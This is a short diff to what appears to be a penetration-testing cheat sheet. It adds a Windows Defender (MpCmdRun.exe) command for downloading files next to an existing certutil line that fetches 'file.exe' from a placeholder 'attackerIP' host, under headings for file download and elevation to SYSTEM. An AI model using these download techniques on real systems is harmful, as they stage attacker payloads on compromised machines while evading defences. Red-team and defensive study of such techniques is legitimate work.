@@ -14,6 +14,7 @@ xsltproc -o scanme.html nmap-bootstrap.xsl scanme.xml
 WINDOWS FILE DOWNLOAD
 ```
 certutil.exe -urlcache -f "http://attackerIP/file.exe" file.exe
+MpCmdRun.exe -DownloadFile -url [url] -path [path_to_save_file]
 ```
 
 ELEVATE TO SYSTEM
